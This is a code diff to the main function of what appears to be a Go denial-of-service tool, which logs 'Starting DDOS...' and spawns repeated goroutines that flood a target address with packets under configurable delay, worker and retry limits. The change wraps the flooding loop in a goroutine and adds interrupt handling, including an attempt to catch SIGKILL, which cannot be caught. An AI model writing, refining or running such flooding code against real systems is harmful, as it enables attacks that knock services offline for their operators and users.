@@ -6,6 +6,8 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"os/signal"
+	"syscall"
 	"time"
 )
 
@@ -60,38 +62,47 @@ func main() {
 
 	log.Log("INFO", "Starting DDOS...")
 
-	for {
-		go func() {
-			err := ddos(opt)
-			if err != nil {
-				log.Log("WARN", "%v", err)
+	go func() {
+		for {
+			go func() {
+				err := ddos(opt)
+				if err != nil {
+					log.Log("WARN", "%v", err)
 
-				if opt.MaxRetryCount <= 0 {
-					return
-				}
-
-				if currentRetryCount += 1; currentRetryCount > opt.MaxRetryCount {
-					log.Log("INFO", "Reached max retry count (%v), exiting...", opt.MaxRetryCount)
-
-					if !opt.IgnoreError {
-						os.Exit(1)
+					if opt.MaxRetryCount <= 0 {
+						return
 					}
+
+					if currentRetryCount += 1; currentRetryCount > opt.MaxRetryCount {
+						log.Log("INFO", "Reached max retry count (%v), exiting...", opt.MaxRetryCount)
+
+						if !opt.IgnoreError {
+							os.Exit(1)
+						}
+					}
+				} else {
+					log.Log("INFO", "Successfully send packet to %v...", opt.Address)
 				}
-			} else {
-				log.Log("INFO", "Successfully send packet to %v...", opt.Address)
+			}()
+
+			time.Sleep(time.Millisecond * time.Duration(opt.Delay))
+
+			if opt.WorkerCount <= 0 {
+				continue
 			}
-		}()
 
-		time.Sleep(time.Millisecond * time.Duration(opt.Delay))
-
-		if opt.WorkerCount <= 0 {
-			continue
+			currentWorkerCount++
+			if currentWorkerCount >= opt.WorkerCount {
+				log.Log("INFO", "Worker count reached (%v), exiting...", opt.WorkerCount)
+				os.Exit(0)
+			}
 		}
+	}()
 
-		currentWorkerCount++
-		if currentWorkerCount >= opt.WorkerCount {
-			log.Log("INFO", "Worker count reached (%v), exiting...", opt.WorkerCount)
-			break
-		}
-	}
+	interrupt := make(chan os.Signal)
+	signal.Notify(interrupt, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
+	<-interrupt
+
+	fmt.Printf("\r")
+	log.Log("INFO", "Interrupted by user, exiting...")
 }
